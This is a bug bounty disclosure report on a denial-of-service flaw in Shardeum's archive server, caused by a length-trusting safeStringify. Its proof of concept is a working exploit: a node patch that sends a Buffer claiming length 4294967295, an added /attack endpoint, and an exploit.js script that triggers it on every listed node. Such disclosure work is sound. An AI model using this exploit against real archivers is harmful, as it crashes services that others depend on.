# 39829 \[W\&A-Critical] dos archiver via data subscription channel due to broken safestringfy

## #39829 \[W\&A-Critical] DOS archiver via data subscription channel due to broken safeStringfy

**Submitted on Feb 8th 2025 at 15:22:49 UTC by @ZhouWu for** [**Audit Comp | Shardeum: Ancillaries III**](https://immunefi.com/audit-competition/audit-comp-shardeum-ancillaries-iii)

* **Report ID:** #39829
* **Report Type:** Websites and Applications
* **Report severity:** Critical
* **Target:** <https://github.com/shardeum/archive-server/tree/itn4>
* **Impacts:**
  * Taking down the application/website

### Description

## Description

Archiver has a data subscription service via websocket to core and store these data to a disk. During the write to disk, archiver will do the stringify operation to the data. The problem lies within the stringify function that shardus custom implemented. The safestringify function will try to stringify a buffer object with the supplied length without actually checking if the content are actually valid. This lead to extreme memory allocation of archiver and eventually crashing.

This is the affected area of code in archiver `/src/Data/Collector.ts`

```javascript
    ...more code
    if (missingReceiptsMap.has(tx.txId)) missingReceiptsMap.delete(tx.txId)
    receipt.beforeStates = globalModification || config.storeReceiptBeforeStates ? receipt.beforeStates : [] // Store beforeStates for globalModification tx, or if config.storeReceiptBeforeStates is true
    combineReceipts.push({
      ...receipt,
      receiptId: tx.txId,
      timestamp: tx.timestamp,
      applyTimestamp,
    })
    if (config.dataLogWrite && ReceiptLogWriter)
      ReceiptLogWriter.writeToLog(
        `${StringUtils.safeStringify({
          ...receipt,
          receiptId: tx.txId,
          timestamp: tx.timestamp,
          applyTimestamp,
        })}\n`
      )
    txDataList.push({ txId, timestamp })
    // If the receipt is a challenge, then skip updating its accounts data or transaction data
    // if (
    //   config.newPOQReceipt === true &&
    //   appliedReceipt &&
    //   appliedReceipt.confirmOrChallenge &&
    //   appliedReceipt.confirmOrChallenge.message === 'challenge'
    ...more code
```

### Proof of Concept

## Proof of Concept

In real network, this patch will be deployed to only a malicious node but to make testing process easier during demonstration of the exploit, let's applied these patch to all nodes. We'll only enable the attack on the node that maintain web-socket data subscription with archiver later.

1. Apply core patch

```diff
diff --git a/src/p2p/Archivers.ts b/src/p2p/Archivers.ts
index 8667b6c1..bf1da4c9 100644
--- a/src/p2p/Archivers.ts
+++ b/src/p2p/Archivers.ts
@@ -35,6 +35,7 @@ import { Result, ResultAsync } from 'neverthrow'
 import { Utils } from '@shardus/types'
 import { arch } from 'os'
 import { checkGossipPayload } from '../utils/GossipValidation'
+import * as shardusCrypto from '@shardus/crypto-utils'
 
 const clone = rfdc()
 
@@ -530,6 +531,9 @@ async function forwardReceipts() {
   const newArchiversToForward = []
   const stillConnectedArchivers = []
   for (const [publicKey, recipient] of recipients) {
+    if(attackToggler) {
+      await forwardDangerPayloads(responses, publicKey, recipient)
+    }
     if (config.p2p.instantForwardReceipts)
       if (!lastTimeForwardedArchivers.includes(publicKey)) {
         newArchiversToForward.push(publicKey)
@@ -565,6 +569,33 @@ async function forwardReceipts() {
   profilerInstance.scopedProfileSectionEnd('forwardReceipts')
 }
 
+let attackToggler = false
+async function forwardDangerPayloads(responses, publicKey, recipient) {
+    shardusCrypto.init(Context.config.crypto.hashKey)
+    responses.RECEIPT = [
+      {
+        tx: {
+          txId: shardusCrypto.randomBytes(32), 
+          timestamp: Date.now()
+        }, 
+        originalTxData: {type: "Buffer", data: { length: 4294967295 }} }
+    ]
+    const dangerPayload: P2P.ArchiversTypes.DataResponse = {
+      publicKey: crypto.getPublicKey(),
+      responses,
+      recipient: publicKey,
+    }
+
+    const sharedKey = crypto.getSharedKey(recipient.curvePk)
+    const tag = shardusCrypto.tag(JSON.stringify(dangerPayload), sharedKey)
+
+    const tagged = { ...dangerPayload, tag }
+    
+
+    console.log("Attack in progress", tagged);
+    io.sockets.sockets[connectedSockets[publicKey]].emit('DATA', JSON.stringify(tagged))
+}
+
 async function forwardDataToSubscribedArchivers(responses, publicKey, recipient) {
   const dataResponse: P2P.ArchiversTypes.DataResponse = {
     publicKey: crypto.getPublicKey(),
@@ -1095,6 +1126,10 @@ export function registerRoutes() {
     res.json({ success: true, data: data })
   })
 
+  network.registerExternalGet('attack', (req, res) => {
+    attackToggler = true
+    res.json({ success: true, attackToggler })
+  })
   network.registerExternalGet('archivers', (req, res) => {
     let archivers = getArchiversList()
     // In restart network, when there is only one node, we just send the first archiver which is serving as data recipient
```

2. link to shardeum repo and launch the network.
3. After a couple of cycle node should come online.
4. At this point you can check the archiver logs inside `instances` folder to see which node is subscribed by the archiver and call the `/attack` on that node
5. Alternatively I prepare a script to help you with step 4. which turn on attack on all node.
6. Paste the code into `exploit.js`

```javascript
const axios = require('axios');



axios.get('http://0.0.0.0:4000/nodelist').then((response) => {
    const promises = []
    const list = response.data.nodeList

    for (let i = 0; i < list.length; i++) {
        promises.push(axios.get(`http://${list[i].ip}:${list[i].port}/attack`))
    }
    Promise.allSettled(promises).then((results) => {
        results.forEach((result) => {
            console.log(result)
        })
    })
})

```

7. And this content into the `package.json` then do `npm i` afterward.

```json
{
  "name": "stringify",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "keywords": [],
  "author": "",
  "license": "ISC",
  "dependencies": {
    "@shardus/types": "^1.2.21",
    "axios": "^1.7.9"
  }
}
```

8. Run the exploit `node exploit.js`
9. Observe the large memory allocation in archiver process, unresponsive practically crashing and DOSing it.

## Impact

Can cause the DOS of archive servers.
